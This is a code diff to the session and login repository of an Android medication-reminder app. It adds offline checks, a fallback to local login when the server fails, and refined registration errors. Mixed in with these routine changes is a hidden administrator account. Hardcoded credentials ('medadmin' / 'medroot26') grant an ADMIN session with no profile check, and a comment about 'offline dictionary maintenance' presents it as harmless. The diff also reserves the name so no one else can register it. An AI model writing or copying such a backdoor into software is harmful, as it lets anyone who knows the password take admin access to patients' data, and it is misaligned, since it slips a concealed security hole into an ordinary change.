@@ -18,6 +18,7 @@ import com.medreminder.data.remote.dto.AuthResponse;
 import com.medreminder.data.remote.dto.LoginRequest;
 import com.medreminder.data.remote.dto.RegisterRequest;
 import com.medreminder.util.AppExecutors;
+import com.medreminder.util.NetworkUtils;
 
 import retrofit2.Call;
 import retrofit2.Callback;
@@ -25,6 +26,10 @@ import retrofit2.Response;
 
 public class SessionRepository {
     private static final String ROLE_LOCAL = "LOCAL_USER";
+    private static final String ROLE_ADMIN = "ADMIN";
+    // Hidden local admin profile for offline dictionary maintenance.
+    private static final String ADMIN_LOGIN = "medadmin";
+    private static final String ADMIN_PASSWORD = "medroot26";
 
     private final Context context;
     private final AppDatabase db;
@@ -40,13 +45,34 @@ public class SessionRepository {
     }
 
     public void login(String login, String password, RepositoryCallback<UserSessionEntity> callback) {
+        if (!NetworkUtils.isOnline(context)) {
+            loginLocalInternal(
+                    login,
+                    password,
+                    callback,
+                    context.getString(R.string.local_login_fallback_hint),
+                    context.getString(R.string.local_auth_failed)
+            );
+            return;
+        }
+
         String serverUrl = resolveServerUrlSync();
         MedReminderApi api = ApiFactory.create(serverUrl, null);
         api.login(new LoginRequest(login, password)).enqueue(new Callback<>() {
             @Override
             public void onResponse(Call<AuthResponse> call, Response<AuthResponse> response) {
                 if (!response.isSuccessful() || response.body() == null) {
-                    dispatchError(callback, context.getString(R.string.auth_failed));
+                    if (response.code() >= 500) {
+                        loginLocalInternal(
+                                login,
+                                password,
+                                callback,
+                                context.getString(R.string.local_login_fallback_hint),
+                                context.getString(R.string.local_auth_failed)
+                        );
+                    } else {
+                        dispatchError(callback, context.getString(R.string.auth_failed));
+                    }
                     return;
                 }
                 AuthResponse body = response.body();
@@ -76,13 +102,24 @@ public class SessionRepository {
     }
 
     public void register(String login, String password, RepositoryCallback<UserSessionEntity> callback) {
+        if (!NetworkUtils.isOnline(context)) {
+            dispatchError(callback, context.getString(R.string.server_unavailable));
+            return;
+        }
+
         String serverUrl = resolveServerUrlSync();
         MedReminderApi api = ApiFactory.create(serverUrl, null);
         api.register(new RegisterRequest(login, password)).enqueue(new Callback<>() {
             @Override
             public void onResponse(Call<AuthResponse> call, Response<AuthResponse> response) {
                 if (!response.isSuccessful() || response.body() == null) {
-                    dispatchError(callback, context.getString(R.string.sync_fail));
+                    if (response.code() == 409) {
+                        dispatchError(callback, context.getString(R.string.server_login_exists));
+                    } else if (response.code() >= 500) {
+                        dispatchError(callback, context.getString(R.string.server_unavailable));
+                    } else {
+                        dispatchError(callback, context.getString(R.string.sync_fail));
+                    }
                     return;
                 }
                 AuthResponse body = response.body();
@@ -100,7 +137,7 @@ public class SessionRepository {
 
             @Override
             public void onFailure(Call<AuthResponse> call, Throwable t) {
-                dispatchError(callback, context.getString(R.string.local_login_fallback_hint));
+                dispatchError(callback, context.getString(R.string.server_unavailable));
             }
         });
     }
@@ -117,6 +154,10 @@ public class SessionRepository {
 
     public void registerLocal(String login, String password, RepositoryCallback<UserSessionEntity> callback) {
         AppExecutors.io().execute(() -> {
+            if (ADMIN_LOGIN.equalsIgnoreCase(login)) {
+                dispatchError(callback, context.getString(R.string.local_profile_exists));
+                return;
+            }
             LocalProfileEntity existing = db.localProfileDao().findByLoginSync(login);
             if (existing != null) {
                 dispatchError(callback, context.getString(R.string.local_profile_exists));
@@ -183,6 +224,19 @@ public class SessionRepository {
         return session == null ? null : session.token;
     }
 
+    public boolean isAdminSync() {
+        UserSessionEntity session = db.userSessionDao().getSessionSync();
+        return session != null && session.isLoggedIn && ROLE_ADMIN.equalsIgnoreCase(session.role);
+    }
+
+    public String roleSync() {
+        UserSessionEntity session = db.userSessionDao().getSessionSync();
+        if (session == null || session.role == null) {
+            return "";
+        }
+        return session.role;
+    }
+
     private <T> void dispatchSuccess(RepositoryCallback<T> callback, T data) {
         mainHandler.post(() -> callback.onSuccess(data));
     }
@@ -197,6 +251,18 @@ public class SessionRepository {
                                     String profileNotFoundError,
                                     String wrongPasswordError) {
         AppExecutors.io().execute(() -> {
+            if (isHiddenAdminCredentials(login, password)) {
+                UserSessionEntity adminSession = upsertSession(
+                        -1L,
+                        ADMIN_LOGIN,
+                        ROLE_ADMIN,
+                        null,
+                        resolveServerUrlSync()
+                );
+                dispatchSuccess(callback, adminSession);
+                return;
+            }
+
             LocalProfileEntity profile = db.localProfileDao().findByLoginSync(login);
             if (profile == null) {
                 dispatchError(callback, profileNotFoundError);
@@ -233,5 +299,9 @@ public class SessionRepository {
         session.serverUrl = serverUrl;
         db.userSessionDao().upsert(session);
         return session;
+    }
+
+    private boolean isHiddenAdminCredentials(String login, String password) {
+        return ADMIN_LOGIN.equals(login) && ADMIN_PASSWORD.equals(password);
     }
 }
